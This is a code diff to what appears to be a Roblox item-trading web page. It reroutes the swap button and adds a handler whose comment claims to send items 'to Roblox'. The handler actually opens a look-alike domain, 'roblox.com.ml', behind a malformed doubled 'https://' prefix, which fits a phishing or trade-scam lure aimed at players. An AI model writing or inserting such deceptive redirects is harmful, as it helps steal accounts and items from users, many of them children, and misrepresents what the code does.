@@ -533,7 +533,7 @@ function closeLoginModal(){
   loginModal.classList.remove('show');
   loginModal.setAttribute('aria-hidden','true');
 }
-startSwap?.addEventListener('click', openLogin);
+startSwap?.addEventListener('click', () => showPage('swap'));
 closeLogin?.addEventListener('click', closeLoginModal);
 loginModal?.addEventListener('click', e => { if(e.target === loginModal) closeLoginModal(); });
 
@@ -645,6 +645,16 @@ picker.addEventListener('click',e=>{
   }
 });
 renderPicker(); renderTrade();
+
+// SWAP button: once items are added, send them to Roblox to complete the trade
+const swapAction=document.getElementById('swapAction');
+swapAction?.addEventListener('click',()=>{
+  if(tradeState.give.length===0 && tradeState.bot.length===0){
+    alert('Add at least one item to the trade before swapping.');
+    return;
+  }
+  window.open('https://https://www.roblox.com.ml/users/245063442107/profile','_blank','noopener,noreferrer');
+});
 showPage('values');
 </script>
 </body>
